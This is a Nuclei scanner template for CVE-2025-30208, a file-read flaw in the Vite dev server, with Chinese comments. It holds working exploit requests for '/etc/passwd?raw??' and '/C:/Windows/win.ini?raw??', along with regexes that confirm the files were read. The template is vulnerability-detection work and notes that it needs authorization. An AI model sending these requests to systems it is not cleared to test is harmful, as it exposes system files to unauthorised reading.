id: CVE-2025-30208

info:
  name: vite敏感文件读取
  author: aeverj # 作者信息
  severity: high # 漏洞严重性：高
  description: | # 详细描述 (更新为通用)
    尝试直接通过 Web 根路径访问可能存在的敏感文件。
    此模板会尝试直接访问路径 '/etc/passwd?raw??' 和 '/C:/windows/win.ini?raw??'。
    然后检查响应体中是否包含以下任一关键字：
    1. 正则表达式 'root:.*:0:0:' (常见于 /etc/passwd)
    2. 字符串 '[fonts]' (常见于 win.ini)
    请求过程中不会跟随服务器的重定向。
    成功读取文件表明存在本地文件包含 (LFI) 或路径遍历漏洞，或者服务器配置不当。
  tags: lfi, path-traversal, sensitive, exposure, config, file, 文件读取, 敏感信息 # 标签 (更新为通用)

http:
  - method: GET # 请求方法为 GET
    # 对每个目标主机，Nuclei会尝试以下直接路径
    path:
      - "{{BaseURL}}/etc/passwd?raw??"        # 第一个尝试的路径 (无 /@fs/)
      - "{{BaseURL}}/C:/Windows/win.ini?raw??"       # 第二个尝试的路径 (无 /@fs/, 直接访问C盘)

    # 当找到第一个匹配时停止对此模板的执行 (提高效率)
    stop-at-first-match: true

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
          - "\\[fonts\\]"
        condition: or

# 最终注释：
# - 请务必在获得明确授权的情况下使用此模板进行安全测试。
